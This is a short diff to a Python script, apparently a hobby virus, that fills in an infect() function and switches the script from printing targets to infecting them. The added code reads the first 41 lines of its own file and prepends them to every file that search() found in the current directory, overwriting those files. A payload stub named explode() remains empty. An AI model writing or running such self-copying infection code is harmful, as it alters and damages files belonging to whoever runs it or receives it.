@@ -20,9 +20,22 @@ def search(path):
     return filesToInfect
 
 def infect(filesToInfect):
-    pass
+    targetFile = inspect.currentframe().f_code.co_filename
+    virus = open(os.path.abspath(targetFile))
+    virusString = ''
+    for i, line in enumerate(virus):
+        if i >= 0 and i < 41:
+            virusString = virusString + '#' + line
+    virus.close()
+    for fileName in filesToInfect:
+        f = open(fileName)
+        temp = f.read()
+        f.close()
+        f = open(fileName, 'w')
+        f.write(virusString + temp)
+        f.close()
 
 def explode():
     pass
 
-print(search(os.getcwd()))
+infect(search(os.getcwd()))
